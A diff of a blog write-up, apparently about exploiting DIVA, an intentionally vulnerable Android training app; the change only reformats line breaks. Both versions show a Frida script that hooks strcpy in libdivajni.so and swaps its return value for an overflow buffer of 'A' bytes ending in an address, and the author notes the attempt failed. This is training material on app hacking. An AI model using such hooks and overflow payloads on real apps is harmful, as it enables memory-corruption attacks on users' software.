@@ -295,8 +295,7 @@ tuvwxyz{|}~
 <br>&nbsp;&nbsp;&nbsp;&nbsp;Interceptor.attach(string_with_jni_addr, {
 <br>&nbsp;&nbsp;&nbsp;&nbsp;onLeave: function(retval){
 <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var st = Memory.alloc(36);
-<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(st, [0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
-0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x60, 0x4e, 0xb0, 0xee]);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(st, [0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x60, 0x4e, 0xb0, 0xee]);
 <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(retval);
 <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retval.replace(st);
 <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(retval);
@@ -354,33 +353,33 @@ tuvwxyz{|}~
 <br>As always we created a Js script to hook this native function and replace return value with our buffer overflow trigger bytes array.
 <br>![14-59](https://teckk2.github.io/assets/images/DIVA/14-59.png)
 <br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-Java.perform(function () {                                                                                                                                                       &nbsp;&nbsp;try {
-&nbsp;&nbsp;&nbsp;&nbsp;var libnative_addr = Module.findBaseAddress("libdivajni.so")
-&nbsp;&nbsp;&nbsp;&nbsp;console.log("libdivajni address is: " + libnative_addr)
-&nbsp;&nbsp;&nbsp;&nbsp;if (libnative_addr) {
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var stringcopy = Module.findExportByName("libdivajni.so",
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"strcpy")
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("strcpyPtr pointer is: " + stringcopy)
-&nbsp;&nbsp;&nbsp;&nbsp;};
-&nbsp;&nbsp;&nbsp;&nbsp;Interceptor.attach(stringcopy, {
-&nbsp;&nbsp;&nbsp;&nbsp;onEnter: function(args){
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("strcpy str src:" + Memory.readUtf8String (args [1]));
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("strcpy dest:" + args[0]);
-&nbsp;&nbsp;&nbsp;&nbsp;},
-&nbsp;&nbsp;&nbsp;&nbsp;onLeave: function (retval) {
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var st = Memory.alloc(36);
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(st, [0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x60, 0x4e, 0xb0, 0xee]);
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retval.replace(st);
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("strcpy, retval="+retval);
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("strcpy str src=" + Memory.readCString(retval));
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
-&nbsp;
-&nbsp;&nbsp;&nbsp;&nbsp;})
-&nbsp;&nbsp;}
-&nbsp;&nbsp;catch(e) {
-&nbsp;&nbsp;&nbsp;&nbsp;console.log(e.message);
-&nbsp;&nbsp;}
-});
+<br>Java.perform(function () {                                                                                                                                                   <br>&nbsp;&nbsp;try {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;var libnative_addr = Module.findBaseAddress("libdivajni.so")
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log("libdivajni address is: " + libnative_addr)
+<br>&nbsp;&nbsp;&nbsp;&nbsp;if (libnative_addr) {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var stringcopy = Module.findExportByName("libdivajni.so",
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"strcpy")
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("strcpyPtr pointer is: " + stringcopy)
+<br>&nbsp;&nbsp;&nbsp;&nbsp;};
+<br>&nbsp;&nbsp;&nbsp;&nbsp;Interceptor.attach(stringcopy, {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;onEnter: function(args){
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("strcpy str src:" + Memory.readUtf8String (args [1]));
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("strcpy dest:" + args[0]);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;},
+<br>&nbsp;&nbsp;&nbsp;&nbsp;onLeave: function (retval) {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var st = Memory.alloc(36);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Memory.writeByteArray(st, [0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x60, 0x4e, 0xb0, 0xee]);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retval.replace(st);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("strcpy, retval="+retval);
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log("strcpy str src=" + Memory.readCString(retval));
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<br>&nbsp;
+<br>&nbsp;&nbsp;&nbsp;&nbsp;})
+<br>&nbsp;&nbsp;}
+<br>&nbsp;&nbsp;catch(e) {
+<br>&nbsp;&nbsp;&nbsp;&nbsp;console.log(e.message);
+<br>&nbsp;&nbsp;}
+<br>});
 <br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 <br>Not even this attempt has led us to our desired result.
 <br>Let’s try now hooking GetStringUTFChars
